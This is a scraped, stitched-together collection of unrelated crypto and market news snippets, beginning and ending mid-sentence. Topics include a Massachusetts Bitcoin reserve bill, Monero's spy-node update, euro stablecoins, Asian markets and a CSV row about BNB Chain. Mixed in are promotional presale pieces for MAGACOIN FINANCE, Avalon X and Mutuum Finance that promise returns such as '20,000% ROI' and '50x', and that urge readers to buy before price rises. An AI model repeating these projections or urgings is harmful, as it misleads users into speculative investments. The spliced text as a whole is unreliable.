bills in 2025, but most remain in committee or face uncertain prospects. Source: Bitcoin Reserve Monitor The tepid response in Massachusetts comes amid a broader cooling of momentum for such initiatives. Bloomberg reported in February that at least four states rejected Bitcoin reserve proposals in a single month, citing volatility and fiscal risk. Jennifer Schulp of the Cato Institute noted that even in bullish market conditions, price swings remain a major obstacle for lawmakers tasked with managing public funds. Under Durant’s plan, the proposed reserve would not compel the state treasury to immediately acquire Bitcoin. Instead, it would authorize, but not require, up to 10% of the stabilization fund to be allocated toward Bitcoin or similar digital assets as part of a diversification strategy. State and Federal Bitcoin Reserve Efforts Converge The bill’s timing coincides with growing federal attention to Bitcoin reserves. In March 2025, President Donald Trump signed an executive order authorizing the creation of a U.S. Strategic Bitcoin Reserve , funded primarily through Bitcoin seized by the Department of Treasury. Senator Cynthia Lummis has since introduced federal legislation that would authorize the government to purchase up to one million BTC over five years, though the bill remains in Congress. In a recent post on X, Lummis reaffirmed her support for the federal initiative , calling the Strategic Bitcoin Reserve a “fabulous articulation” of why the U.S. should hold Bitcoin as a strategic asset. She added that while legislative delays persist, “the acquisition of funds for an SBR can start anytime.” Senator Cynthia Lummis took to X Wednesday after reports emerged that the U.S. may not hold as much Bitcoin in its reserve as believed. #CynthiaLummis #BitcoinReserve https://t.co/FWyTqWqIIG — Cryptonews.com (@cryptonews) July 16, 2025 Critics, however, continue to warn that its extreme volatility makes it unsuitable for taxpayer-backed reserves. Still, momentum for such measures continues internationally. Sweden recently introduced a parliamentary motion calling for a national Bitcoin strategy, while Kyrgyzstan and the Philippines are considering similar frameworks. With the Joint Committee on Revenue expected to issue its decision by early December, the Massachusetts Bitcoin reserve bill now sits at a crossroads.

Key Takeaways: Monero released its “Fluorine Fermi” update (v0.18.4.3) to improve protection against spy nodes that threaten user privacy. The upgrade introduces a smarter peer selection algorithm to avoid connections with potentially malicious subnet groups. The update reinforces Monero’s ongoing battle to preserve transaction anonymity amid growing surveillance efforts. The new release, named “Fluorine Fermi” (v0.18.4.3), was announced Thursday on X , with the Monero team calling it “a highly recommended update” for all users. The upgrade introduces a smarter peer selection algorithm designed to help nodes avoid large subnet groups commonly associated with surveillance activity, pushing users to connect with safer peers instead. Monero Strengthens Network Privacy With New Defense Against Spy Nodes Spy nodes are a long-standing concern in Monero’s ecosystem. They are malicious nodes or networks that attempt to link IP addresses with transactions, effectively undermining the privacy guarantees of the blockchain. Monero’s latest update adds another layer of protection to counter such threats, while also improving network reliability and stability. The Monero community has long viewed these attacks as one of the most persistent threats to its mission of untraceable transactions. In response, developers and researchers have explored multiple strategies, including running self-operated nodes, ban lists for suspicious IPs, and the Dandelion++ protocol, which obscures the origin of transactions before they spread through the network. In late 2024, the Monero Research Lab proposed a mechanism allowing node operators to block known spy IPs. We're excited to announce that CLI v0.18.4.3 'Fluorine Fermi' has been released! 'This is a highly recommended release that enhances protection against spy nodes.' — Monero (XMR) (@monero) October 9, 2025 However, experts noted that determined adversaries could simply create new nodes, making this a temporary fix rather than a long-term solution. Concerns over Monero’s network security were reignited last year after a leaked Chainalysis video claimed the analytics firm had traced transactions dating back to 2021 using its own “malicious nodes.” With Fluorine Fermi, Monero continues its push to stay ahead in what its developers describe as an ongoing “cat-and-mouse game” between privacy advocates and surveillance entities, a defining battle for the future of anonymous blockchain transactions. Qubic Claims 51% Control of Monero Hashrate After Recovering From DDoS Attack In August, Layer-1 blockchain Qubic claimed it seized 51% of Monero’s hashrate , a level of control that in theory could rewrite the chain, double-spend transactions, or censor activity, all for an estimated cost of just $100,000 per day. The pool initially struggled, falling back to seventh-largest on the network after a distributed denial of service (DDoS) attack on August 4 reduced its hashrate from 2.6 gigahashes per second (GH/s) to just 0.8 GH/s. However, Qubic later restored its power and claimed majority control. A 51% attack occurs when one party controls the majority of a blockchain’s mining power or stake, allowing them to alter the chain’s history or block transactions. Qubic founder Sergey Ivancheglo admitted the strategy was designed to monopolize Monero’s mining, eventually rejecting blocks from rival pools.

Pierre Gramegna, managing director of the European Stability Mechanism (ESM), said Europe must accelerate its efforts to issue domestic stablecoins and strengthen its digital financial sovereignty. “Europe should not be dependent on U.S. dollar-denominated stablecoins, which are currently dominating markets,” Gramegna said during a Thursday hearing on the eurozone’s economic outlook, where digital assets were among the topics discussed. He added that “Stablecoins are an inevitable part of this equation. In a rapidly evolving financial landscape, Europe should do its best to facilitate the generation of euro-denominated stablecoins by domestic issuers.” Digital Euro Gains Momentum as EU Debates Strategy to Counter U.S. Crypto Lead Gramegna’s comments come amid growing concerns that the U.S. is gaining a decisive lead in the digital currency space following the introduction of the GENIUS regulatory framework earlier this year , which spurred growth in dollar-backed stablecoins such as USDC and USDT. European officials worry that continued reliance on U.S.-issued tokens could undermine the EU’s control over its financial system and payment infrastructure. Paschal Donohoe, president of the Eurogroup, supported Gramegna’s stance on financial innovation but noted that the European Central Bank’s (ECB) digital euro project could also play a vital role in modernizing payments. “The digital euro could still be a net positive for commerce in the region,” he said. Momentum is already building behind the digital euro initiative. According to ECB Executive Board member Piero Cipollone, the central bank could roll out a digital euro by 2029 as discussions among member states progress. A digital euro could launch in 2029, says ECB board member Piero Cipollone, citing growing momentum and progress in member-state talks. #digitaleuro #ECB https://t.co/yn43I38DdH — Cryptonews.com (@cryptonews) September 24, 2025 He described recent talks as a “major breakthrough” after euro area finance chiefs reached consensus on customer holding limits to protect bank deposits. Cipollone said that by early May next year, the European Parliament should have a position on the legislative framework underpinning the project, following an October progress report and several rounds of negotiations. Member states are also expected to reach a general agreement by the end of this year. The digital euro is designed to reduce Europe’s reliance on private payment companies such as Visa and PayPal, while also curbing the influence of dollar-denominated stablecoins in the region. However, several technical and policy questions remain unresolved, including privacy safeguards, bank coexistence, and whether the currency should operate on a public blockchain such as Ethereum or Solana . European officials are fast-tracking the digital euro, weighing Ethereum or Solana, as pressure mounts to keep pace with US progress in digital currencies. #DigitalEuro #ethereum #Solana https://t.co/vMzIfEMIdu — Cryptonews.com (@cryptonews) August 22, 2025 Supporters argue that euro stablecoins and a digital euro could reinforce Europe’s competitiveness in global finance, while skeptics warn that delays in regulation could leave the region further behind the U.S. in shaping the future of digital payments. Europe Steps Up Stablecoin Push to Counter U.S. Dollar Dominance European policymakers and financial institutions are intensifying efforts to develop euro-backed stablecoins, seeking to counter the overwhelming dominance of U.S. dollar-pegged tokens. In July, European Central Bank (ECB) adviser Jürgen Schaaf called for stronger global coordination on stablecoin regulation , warning that gaps between U.S. and EU frameworks could reinforce dollar supremacy. ECB advisor warns Europe risks losing monetary sovereignty as euro-denominated stablecoins capture just 0.15% of $230 billion global stablecoin market. #Europe #Stablecoin https://t.co/ztXdNdvv1C — Cryptonews.com (@cryptonews) July 29, 2025 Writing on the ECB’s website, Schaaf urged support for “properly regulated euro-denominated stablecoins,” arguing they could strengthen Europe’s monetary sovereignty if designed with robust safeguards. Schaaf pointed to the U.S. GENIUS Act, signed into law in July, as “broadly aligned” with the EU’s Markets in Crypto-Assets (MiCA) framework but less stringent in certain areas. He said consistent global standards are needed to prevent market fragmentation and regulatory arbitrage. The ECB adviser’s remarks follow earlier concerns from Bank of Italy Governor Fabio Panetta, who noted the limited adoption of euro stablecoins despite MiCA’s rollout . Panetta said the digital euro could help bridge that gap, while Schaaf emphasized that private innovation and distributed ledger technology (DLT) must complement public initiatives. The ECB has already approved two DLT pilot projects , Pontes and Appia, aimed at improving wholesale and cross-border payments. At the same time, nine of Europe’s largest banks, including ING, UniCredit, CaixaBank, and Danske Bank, have announced plans to jointly launch a euro-backed stablecoin in 2026 . Nine European banks will launch a MiCA-regulated, euro-backed stablecoin that will contribute to Europe’s strategic autonomy in payments. #EURStablecoin #MiCARegulation https://t.co/FEUGRf7hgS — Cryptonews.com (@cryptonews) September 25, 2025 The consortium will seek licensing under MiCA and promises faster, cheaper, and 24/7 cross-border transactions. The initiative highlights Europe’s growing determination to reduce reliance on U.S. stablecoins, which account for roughly 99% of global supply. ECB data shows euro-pegged tokens remain below €350 million in circulation, a gap European regulators and banks now appear intent on closing.

Traders assessed remarks from Fed officials on interest rates and the start of the U.S. earnings season. The U.S. on Thursday imposed sanctions on about 100 individuals, entities, and vessels accused of aiding Iran’s oil and petrochemical trade, the Trump administration said. Silver edged down to around $49 per ounce on Friday but remained on track for its eighth consecutive weekly advance. Gold rose to around $3,980 per ounce on Friday, heading for its eighth consecutive weekly gain after notching a record high earlier in the week. Japan ( NKY:IND ) fell 0.84% to below 48,400, while the broader Topix dropped 1.1% to 3,220 on Friday.

Japan’s producer prices rose 2.7% year-on-year in September 2025, keeping the same pace as in the previous month but exceeding market forecasts of 2.5%. Japan’s bank lending rose 3.8% in September 2025, accelerating from a downwardly revised 3.5% gain in August and exceeding market expectations for a 3.7% growth. Japan’s ruling party chief Sanae Takaichi said Thursday that if elected prime minister, she would immediately push for measures to ease the economic impact of rising living costs. “We must pass through parliament legislation to cut the gasoline tax and compile a supplementary budget. Otherwise, people will continue to suffer from the rising cost of living, which will hurt consumption, weigh on corporate profits, and hurt the economy,” she said. China ( SHCOMP ) fell 0.58% to around 3,920, while the Shenzhen Component dropped 0.8% to 13,613 on Friday, giving back part of the prior session’s gains amid soft global cues. The offshore yuan Investors now turn their attention to the Communist Party’s leadership meeting on Oct. 20–23 and a possible Xi-Trump meeting at the APEC summit later this month for new policy signals. Caution also grew ahead of key Chinese data next week, including September trade figures, CPI and PPI readings, and credit statistics. President Donald Trump predicted that China would soon resume purchases of U.S. soybeans following his upcoming meeting with President Xi Jinping, despite ongoing trade tensions. Hong Kong ( HSI ) fell 1.38% to 26,501 in early trade on Friday, marking a fifth straight fall and the lowest in near two weeks. India ( SENSEX ) rose 0.45% to 82,507 in morning trade on Friday, gaining for the second straight session. Australia ( AS51 ) fell 0.13% to around 8,955 in Friday morning trade, reversing the previous session’s gains, as gold and energy stocks dragged the market lower amid easing commodity prices. The Australian dollar appreciated to around $0.657 on Friday, slightly rebounding from a nearly two-week low touched the previous day after RBA Governor Michele Bullock struck cautious remarks. Australia’s economy is performing well, with inflation within the central bank's 2–3% target range and a tight labor market, Governor Michele Bullock told a parliamentary committee Friday.

The project’s explosive start and ambitious roadmap have made it one of the most talked-about opportunities of 2025, with analysts projecting up to 20,000% ROI once listings go live. Solana Battles Between Recovery and Rejection According to the latest report from crypto analysis firm MakroVision, Solana’s price action suggests a tug-of-war between recovering bullish sentiment and the risk of another short-term pullback. The firm noted that SOL’s 0.382 Fibonacci retracement near $192 has served as a crucial support level, helping the token rebound above $204 and $223 in recent sessions. However, the market remains at a critical inflection point. Analysts highlighted the $223 zone as the key level to watch in the coming days. If buyers can maintain momentum above that area, the next targets sit between $246 and $264, which could open the door for a challenge of Solana’s all-time high. But if momentum fades and the token drops below $223, a slide back toward $204 or lower is possible. Technical Setup and Market Sentiment MakroVision emphasized that Solana’s structure remains technically healthy following its recent correction. The token has shown strong support reactions, but analysts caution that sustained volume and continued bullish pressure are needed for further upside. “The next few trading sessions will determine whether this rebound evolves into a full recovery or loses steam,” the firm explained. Despite near-term uncertainty, Solana’s underlying fundamentals – including its growing developer activity and expanding real-world applications – remain strong. The network continues to attract developers working on DeFi, NFTs, and tokenization projects, reinforcing its position as one of the top-performing Layer-1 ecosystems. MAGACOIN FINANCE Hits Fastest-Ever Presale Target While Solana’s next move depends on key technical levels, investors are showing growing excitement for MAGACOIN FINANCE, a rapidly emerging altcoin that’s dominating presale conversations. The project just raised over $16 million in record time, becoming one of the fastest-growing early-stage crypto launches of 2025. Unlike typical presales that rely on hype, MAGACOIN FINANCE’s success comes from a combination of smart tokenomics, transparent leadership, and an expanding ecosystem designed for scalability and real-world use. Its presale performance has already caught the attention of major crypto influencers and analysts, many of whom see it as a rare opportunity to capture exponential growth ahead of broader market listings. Traders are calling it one of the top early-stage investment opportunities of the year, with projections of up to 20,000% ROI based on current momentum and presale performance. The project’s growing global community and investor confidence have positioned it as a leading altcoin contender heading into 2025’s bull market. Solana’s Next Move Could Set the Tone For Solana, the coming weeks will likely define its trajectory for the rest of the quarter. If the token sustains support above $223, analysts see potential for a rally toward $260, which would confirm renewed bullish strength and restore confidence among traders. On the other hand, losing that key level could lead to another round of consolidation before any sustained move higher. Either way, both Solana and MAGACOIN FINANCE stand at defining moments. Solana faces a test of technical strength, while MAGACOIN FINANCE is proving how early-stage innovation, backed by strong execution, can capture the market’s imagination and investor capital alike.

52929994,603088,1760079619,https://resources.cryptocompare.com/news/13/52929994.jpeg,BNB Smart Chain (BSC) Hits Record 5 Trillion Daily Gas Usage As Network Activity Surges,https://bitcoinist.com/bnb-smart-chain-hits-5-trillion-gas-activity/,"As BNB rallies to new highs, the BNB Chain ecosystem achieves new milestones, fueled by record performances in network activity, gas efficiency, and trading-driven growth. BSC Hits New Gas Usage Milestone On Wednesday, the BNB Chain ecosystem hit new record levels of gas in a single day, driven by a significant increase in network activity. According to BscScan data , the BNB Smart Chain (BSC) has had a remarkable week in this metric, surpassing its June 2025 high of 3.44 trillion twice. On October 8, BSC reached a new all-time high (ATH) of 5.02 trillion gas used in a single day, overtaking Tuesday’s 4.17 trillion milestone. Notably, the network has seen over 2 trillion in gas used daily since the start of the month, signaling growing on-chain activity and ecosystem adoption. This feat comes as the BNB Chain announced that its new 0.05 Gwei standard gas price has become fully adopted across the ecosystem, with partners such as Binance, Binance Wallet, Trust Wallet, and decentralized exchange (DEX) Aster implementing it as their default gas configuration. In late September, BNB Chain validators proposed halving fees and accelerating block speeds to keep BSC “competitive with the fastest chains in crypto.” The now-approved plan aimed to lower the minimum gas price from 0.1 Gwei to 0.05 Gwei, or $0.005 per transaction, and accelerate block intervals from 750ms to 450ms. The change follows a series of gas cuts since April 2024, which have led to a 75% drop in median fees and a 140% increase in daily transactions to over 12 million. The announcement noted that “gas fees matter most for traders” as trading is now the dominant activity on BNB Chain, with swap-related transactions surging from 20% at the start of the year to 67% by June. Now that the new standard is fully implemented, the 5 trillion gas milestone was accompanied by 24 million swap-related transactions in 24 hours, accounting for 77% of all network activity. BNB Chain Ecosystem Momentum Grows The ecosystem has also seen BSC outperform other networks in DEX activity, with data showing that it recently ranked first across all chains. As reported by Bitcoinist, the network surpassed Ethereum and Solana on DEX daily trading and chain fees on Wednesday. According to DeFiLlama data, BSC recorded over $6.05 billion in DEX trading volume, overtaking Solana’s $4.73 billion and Ethereum’s $3.88 billion. Meanwhile, the chain also saw $5.57 million in daily transaction fees, approximately 140% more than its two biggest competitors. On Thursday, BSC continues to lead in chain fees with $7.88 million in the past 24 hours. However, it has fallen to the second spot in DEX daily trading volume with $6.10 billion, surpassed by Ethereum’s $6.20 billion. The chain also placed second in active addresses, with 2.54 million. Meanwhile, the Binance Wallet recently led among IDO launchpads in terms of profitability, driven by the massive returns of various projects built on the network. In September, the Binance Wallet hit an all-time high Return of Investment (ROI) of 7,976%, surpassing most IDO launchpads in multiple timeframes. Notably, seven of the top ten tokens with the ATH IDO returns on the Binance Wallet were BNB Chain projects, recording historical returns of up to 2,000x. Amid the ecosystem’s momentum, BNB has continued to break past multiple price barriers, seeing a wave of capital rotation from Solana and reaching a new ATH of $1,330 yesterday.",Crypto News|BNB|BNB Chain|BNB chain ecosystem|BNB Chain gas|BNB rally|BNB Smart Chain|bnbusdt|BSC|BSC DEX Volume|BSC gas usage|ETH|solana,EN,0,0,CRYPTOCURRENCY|BNB|TRADING|EXCHANGE|ETH,"{'name': 'Bitcoinist', 'img': 'https://images.cryptocompare.com/news/default/bitcoinist.png', 'lang': 'EN'}",bitcoinist,2025-10-10 07:00:19

Under the surface, demand remains robust as U.S. spot Bitcoin ETFs just logged an eighth straight day of net inflows, with one session alone adding $441 million. Related Reading: Why The Bitcoin Price Might Never Drop Below $100,000 Again Over the past week, cumulative ETF net flows have climbed by billions, pushing total Bitcoin ETF assets toward $160 billion. This steady pipeline of capital, now a fixture of pension funds, RIAs, and asset managers, continues to soak up more BTC than miners create, tightening free float and muting deeper pullbacks. The setup reinforces Bitcoin’s evolving role as a portfolio diversifier and inflation hedge, especially as the U.S. dollar wobbles and macro uncertainty lingers. Technical Levels Point Bitcoin (BTC) to $117K Support, $125K–$126K Ceiling After the spike to new highs, BTC is digesting gains in a sideways band. $125,000–$126,000 remains the near-term ceiling; a decisive daily close above that zone would likely unlock momentum toward $128,000–$130,000 and extend price discovery. On the downside, $117,000 is developing as the first key support, aligning with a heavy cost-basis cluster and prior breakout structure. A deeper fade could probe $114,000 near the 50-day moving average, where trend buyers may re-engage. Momentum indicators are neutral-to-constructive (RSI mid-zone, MACD flattening), consistent with healthy consolidation above rising MAs. Traders are watching for: Spot-led strength over derivatives (cleaner advances). ETF inflows staying positive (supports dips). Range break above $126,000 on expanding volume (bullish confirmation). BTC's price records losses on the daily chart. Source: BTCUSD on Tradingview Scarcity Meets Institutional Liquidity Bitcoin’s post-halving issuance of 450 BTC/day collides with institutional demand that’s arriving “on schedule” via ETFs, creating a structural supply deficit. Year to date, institutional accumulation has outpaced new supply many times over, a dynamic that historically precedes trend extensions. Add in the dollar-debasement narrative, stubborn inflation, rising debt, and policy ambiguity, and credibly scarce assets like BTC and gold remain in favor.

Investors are growing increasingly impatient as XRP’s mission of revolutionising global payments is great on paper, but not much can be seen in its price action. This is why investors are moving to innovative projects like Avalon X(AVLX) that solve a major problem in the real estate market. Using blockchain technology, the AVLX real estate tokenization crypto brings in hospitality, staking, and on-chain finance together. With only days left before a major price increase, investors are seen accumulating AVLX tokens. Join the Avalon X team for a live AMA today, October 10th on their official X . Why is XRP Price Struggling to Take Off? Ripple Labs recently ended its legal struggle with the SEC with a $125 million settlement . This was a massive moment not just for XRP but for the crypto industry as a whole because it brought a lot of clarity in the market as far as the regulations were concerned. Naturally, investors expected the same to translate into the price movement too. However, XRP’s performance in the past month has been disappointing. The token is trading around the 2.80–$3.00 range. Analysts suggest keeping an eye on ETF approvals and other XRP news that can potentially push the price. What is the Avalon X Presale Doing Different? Payment tokens like XRP take off once adoption is massive due to network effects. However, RWA crypto presales, such as Avalon X, utilize exclusivity, benefits, and experience as a product. Through this token, users can avail significant discounts on vacations, get special benefits, and also get boosted entries in Avalon X Giveaways. The project does not play in a complex and regulated industry like payments, such as XRP. It rather captures the growing RWA market. With just three days left on the countdown displayed on the official Avalon X website, investors are rushing to the AVLX crypto presale before the Stage 2 major price increase. Consumer-first platforms like Avalon X experience high referral growth for several reasons. Firstly, travel products get attention online as visitors often post their pictures on social media. Moreover, the word-of-mouth marketing in this industry is pretty impactful too. To further increase the referral traction, the platform has announced an Avalon X $1M prize , which is currently active. Additionally, Avalon X’s crypto townhouse giveaway is going viral on social media too. One lucky winner will be the owner of a fully deeded townhouse in the gated Eco Avalon development which is already built. Alongside the giveaways Avalon X is turning up the excitement with its referral program, giving participants 10 bonus entries for every successful referral plus an extra 10% in tokens as a reward. It’s a simple way to boost your odds and earn more while spreading the word. Is Avalon X Token Investable Right Now? In a fairly new industry like crypto, building trust is a very important task for any project. The Avalon X crypto team understands this and is therefore audited by CertiK . Furthermore, the tokenomics are solid and come with a capped 2B supply along with a burn strategy to increase value over time. The market data suggest that it is the right time to invest in real estate crypto. Avalon X is the perfect platform to do so, as it offers a solid product with real demands. Moreover, the marketing and the growth strategy are on point as well. To get additional benefits, investors must act now, as there is a 10% bonus currently active. With just days left, now is the time for action before Avalon X price goes parabolic.

The inclusion of XRP reflects this strategy, highlighting the company’s recognition of digital assets as an integral part of modern enterprise operations and financial infrastructure. XRP’s Enterprise-Grade Utility XRP is currently the fourth-largest cryptocurrency by market capitalization and remains a leading option for international settlement. Its underlying XRP Ledger enables transaction completion within three to five seconds at minimal cost while consuming less energy compared to proof-of-work systems. These features make XRP especially suitable for businesses seeking efficient and sustainable blockchain solutions. Reliance’s move mirrors a broader trend in corporate finance, where enterprises increasingly adopt digital assets to enhance payment efficiency and operational flexibility. XRP’s technology provides both speed and scalability, which are key considerations for institutions managing large-scale financial transactions.

He explained that adding XRP alongside Bitcoin, Ethereum, and Cardano reinforces Reliance’s position as an early corporate adopter of blockchain technology. The initiative, he said, strikes a balance between innovation and sound governance and regulatory compliance, supporting both growth and shareholder value. Commenting on the announcement, X user Crypto Dog noted that companies are beginning to understand the benefits of modern blockchain systems that process transactions in real-time and at a fraction of the traditional cost. Reliance’s inclusion of XRP in its treasury marks another step in mainstream corporate engagement with blockchain assets. The move highlights XRP’s growing appeal to institutional investors and its expanding role in enterprise-grade financial systems.

Growth coins like Ethereum (ETH) once turned modest portfolios into fortunes, and now investors are looking for the next opportunity that offers real utility with high upside. Mutuum Finance (MUTM) will soon become one of those rare DeFi projects that blend strong fundamentals, transparency, and growth-ready mechanics. For those investing in crypto now, early entry into MUTM during its live presale will set a foundation for future growth. Phase 6 presale momentum and strong audit backing Mutuum Finance (MUTM) is in Phase 6 of its presale. It has already generated around $17 million, with over 16,800 holders participating. Out of the 170 million tokens available for this phase, about 60% are already sold at the price of $0.035 per token. The next phase will raise the price to $0.040—a 15% increase. The total supply is capped at 4 billion tokens, and the momentum shows investors are confident in the project’s future. The project’s security has been independently verified. Its CertiK audit involved both Manual Review and Static Analysis, earning a TokenScan Score of 90.00 and a Skynet Score of 79.00. The audit request was made on February 25, 2025, and revised on May 20, 2025, confirming the team’s focus on transparency. With over 12K Twitter followers, Mutuum Finance (MUTM) has built strong early community trust, and Phase 6 buyers are rushing before the price moves up to $0.040. How Mutuum Finance (MUTM) lending will work Mutuum Finance (MUTM) will operate through a Peer-to-Contract (P2C) model where users will lend assets into liquidity pools and earn returns. For example, a lender will deposit $15,000 USDT into an ETH/USDT pool and receive mtUSDT in a 1:1 ratio. With an expected average APY of 15%, this deposit will earn $2,250 in a year. The mtTokens will represent ownership in the pool, growing in value as interest accrues. Lenders will also be able to use mtTokens as collateral for further loans or withdraw them based on liquidity. Borrowers will benefit too. A borrower will post $1,000 worth of ETH as collateral and borrow up to 75% of that value. This setup will allow the borrower to keep their ETH exposure while still accessing capital. They will be able to select between variable and stable rates. Stable-rate loans will rebalance when the supply rate drops to 90% of the variable equivalent, helping maintain predictable borrowing costs. The Peer-to-Peer (P2P) segment will cater to tokens with higher volatility, like PEPE, or FLOKI. Here, lenders and borrowers will negotiate terms directly, including rates and durations. These transactions will stay isolated from the P2C pools, ensuring that the main liquidity remains stable even during volatile periods. Mutuum Finance (MUTM) is making a new system for crypto lending and borrowing. The first version, called V1, will launch on the Sepolia Testnet at the end of 2025. It will have key tools like a liquidity pool, mtToken, debt token, and a liquidator bot. These will help the platform run safely and smoothly. At first, users can lend and borrow crypto easily. They will also be able to use ETH or USDT as collateral. Collateral, liquidations, and risk management All loans will remain overcollateralized to ensure platform safety. The Stability Factor will track each loan’s collateral strength. When collateral values fall below preset thresholds, liquidations will trigger automatically. Liquidators will buy the debt at a discount, while part of the penalty will flow to the Mutuum Finance (MUTM) treasury. This revenue will later support ecosystem incentives and growth. Stablecoins and ETH will have higher Loan-to-Value (LTV) ratios of up to 75%, with liquidation thresholds at around 80%. Volatile assets will stay limited between 35% and 60% LTV with thresholds near 65%. Reserve factors will vary: about 10% for safer assets and up to 55% for riskier ones. These settings will balance capital efficiency with safety. Deposit and borrow caps will control exposure, preventing sudden liquidity shocks. When liquidity tightens, the protocol will adjust liquidation incentives to attract more liquidators. These measures will keep markets efficient even during high volatility. Platform experience, security, and rewards Mutuum Finance (MUTM) already features a live dashboard where investors can connect their wallets, view holdings, and estimate ROI. The Top 50 Leaderboard is rewarded with bonus MUTM tokens. This gamified experience will keep users engaged. Security remains central. Alongside its CertiK audit, the platform will host a $50,000 USDT Bug Bounty Program. Rewards will range from $2,000 for critical findings to $200 for low-level issues. Additionally, the $100,000 giveaway will see ten winners receive $10,000 worth of MUTM tokens each, further boosting community engagement. Why investors call it the next ETH The price of Mutuum Finance (MUTM) has already gone up 250% from $0.01 in Phase 1 to $0.035 now. A person who acquired $5,000 worth of MUTM in Phase 1 will now have $17,500 worth of tokens. When the token goes on sale for $0.06, the same investment will be worth $30,000, which is 6x what it was worth before. The prospect for growth is still good. The Layer-2 integration that is coming up will lower the cost of transactions and speed them up. The beta version of the lending app will be available around the time of the listing, so users can engage with it in real time. Planned listings on major exchanges like Binance and Kraken will make the token easy for traders all over the world to find and use, which will boost visibility and participation even more. If you’re thinking about investing in crypto and want to know if it’s a good idea, the answer is time and fundamentals. Mutuum Finance (MUTM) is a mix of the two. Phase 6 is already 60% sold out, and the price will go up by 15% in Phase 7. There is still a limited time for early buyers to get MUTM for $0.035 before it goes up to $0.040. People who wish to build the perfect portfolio won’t want to miss this chance before the project’s beta launch and exchange debut drive up demand.

As Luxembourg steps up its crypto-friendly policies, Ripple is also accelerating its expansion plans on the continent. “We are extremely excited about our future within the EU,” Ripple’s Chief Legal Officer (CLO) Stuart Alderoty said after his meeting with Luxembourg Finance Minister Gilles Roth. This meeting took place as part of Ripple's efforts to obtain an e-money institution license from Luxembourg. If granted, the company will be authorized to offer financial services throughout the European Economic Area (EEA). Alderoty stated that Ripple intends to use the region as a strategic expansion base, saying, “The EU pioneered a comprehensive legal framework for digital assets with its MiCA (Markets in Crypto-Assets) regulation.” Related News: Despite the Government Shutdown in the US, Two Internal Sources Provided Positive News for Cryptocurrencies The Luxembourg government is also taking a proactive stance in this process. Following the meeting, Finance Minister Roth shared the following on social media: “We discussed Ripple's vision for Europe and Luxembourg and reaffirmed our commitment to digital innovation.” The meeting follows Luxembourg's recent decision to invest 1% of its sovereign wealth fund in cryptocurrencies. This move marks the first time a European state has officially adopted Bitcoin (BTC) as an asset class and is expected to accelerate the shift in cryptocurrency sentiment across the continent. Ripple's European strategy isn't limited to Luxembourg. Earlier this year, the company established a separate legal entity in the country and partnered with Spanish bank BBVA for digital asset custody services. In May, its MiCA-compliant Euro stablecoin, the Schuman Financial Euro, was launched on the XRP Ledger. *This is not investment advice.

Source: TradingView The report spotlights the election of Sanae Takaichi, who is likely to become Japan’s first female prime minister, a milestone that has reshaped investor sentiment and jolted currency and equity markets. Following her victory in the Liberal Democratic Party’s leadership race, the yen plunged to historic lows against the euro and broke past 150 versus the U.S. dollar, while the Nikkei 225 rose 4.8 percent to a new all-time high, approaching the 48,000 mark. Analysts note that Takaichi’s pro-growth, stimulus-friendly platform has altered expectations for the Bank of Japan’s monetary policy. Betting markets, which had placed a 60 percent chance on an October hike, quickly revised their expectations downward to 24 percent. Markets are now pricing in a likely hike to 0.75 percent in December. This adjustment has reinforced yen weakness and bolstered equity momentum. Key highlights: Political milestone: Sanae Takaichi becomes Japan’s first female prime minister. Currency markets: Yen hits record lows against the euro; USD/JPY breaks the 150 threshold. Policy shift: Expectations for a Bank of Japan rate hike postponed to December. Equities rally: Nikkei 225 could surge toward 50,000, with the index already approaching 48,000 on stimulus hopes and continued low interest rates. Near-term catalysts: October’s parliamentary confirmation vote and the BOJ’s policy meeting loom large.

Mutuum Finance (MUTM) is standing out among the best cryptocurrencies to invest in, with several experts projecting a 50x surge as its ecosystem advances. In a market where crypto prices today remain volatile, MUTM’s design focuses on utility, security, and sustainable growth rather than speculation. The foundation of a 50x growth: real utility and stable yield The project is now in Phase 6 of its presale, priced at $0.035, and about 60% of tokens have been claimed. Over $17 million has been raised, and more than 16,800 holders have already joined. The next phase will lift the price to $0.04, marking a 15% increase and setting the stage for what analysts describe as one of the most promising DeFi launches of 2025. The first version, named V1, will go live on the Sepolia Testnet by the end of 2025. It will include tools like a liquidity pool, mtToken, debt token, and a liquidator bot. In the beginning, users can lend, borrow, and use ETH or USDT as collateral without any hassle. Mutuum Finance (MUTM) will reshape decentralized lending through its two-layer infrastructure — a Peer-to-Contract (P2C) model for stable assets and a Peer-to-Peer (P2P) system for higher-risk tokens. The platform’s design will create a balanced financial ecosystem where users earn, borrow, and trade with transparency and control. It starts with the lender’s side. Users will deposit tokens such as USDC or ETH into audited smart contracts. These deposits will generate mtTokens, representing the lender’s share in the liquidity pool. mtTokens will automatically earn yield as borrowers use the pool. Lenders will then have the option to stake mtTokens to earn additional MUTM rewards. These rewards will come from the platform’s revenue and open-market buybacks — a system that will strengthen demand for MUTM while rewarding long-term participants. The borrower’s process will be equally straightforward. Borrowers will post collateral in supported tokens to secure loans. For instance, posting $1,000 worth of ETH will allow borrowing up to 75% of that value, depending on the asset’s Loan-to-Value (LTV) ratio. All loans will remain over-collateralized, and if collateral value drops, the system will trigger automatic liquidations to protect lenders and maintain balance. Stable interest rate model and $1 stablecoin Mutuum Finance (MUTM)’s Stable Interest Rate Model will bring predictability to borrowing. When a borrower locks in a rate, it will remain stable for the loan’s duration. Rates will rebalance only during sharp market shifts, allowing both lenders and borrowers to plan their positions without fear of sudden volatility. The platform’s Stablecoin innovation will also play a major role in long-term growth. This decentralized stablecoin will stay pegged to one dollar. It will be minted when users borrow against collateral and burned when loans are repaid or liquidated. Governance will control the interest rate to maintain the peg — increasing it when the token trades below one dollar and reducing it when it trades above. Arbitrage opportunities will further support the $1 price target, ensuring continuous market stability. Security, governance, and the road ahead Mutuum Finance (MUTM) is being built with advanced price discovery and safety layers. The platform will use Chainlink feeds along with fallback oracles and on-chain DEX TWAPs to ensure accurate and tamper-resistant pricing. This system will prevent manipulation during lending and liquidation, protecting all participants. The protocol will include Deposit and Borrow Caps, limiting excessive exposure to single assets and ensuring consistent liquidity. A Reserve Factor will direct part of the collected interest into a safety pool that will strengthen the protocol’s resilience during volatile market periods. These risk parameters will act as a financial firewall against extreme market events. Security will remain central to Mutuum Finance (MUTM)’s strategy. The project has undergone a CertiK audit, achieving a Token Scan Score of 90 and a Skynet Score of 79, confirming strong smart contract integrity. To strengthen transparency, the team has launched a $50,000 Bug Bounty Program with rewards up to $2,000 for critical findings and a $100K community giveaway , where ten winners will each receive $10,000 worth of MUTM tokens. The development roadmap reflects a disciplined approach. Phase 1 focused on presale initiation, audits, and early marketing. Phase 2 will 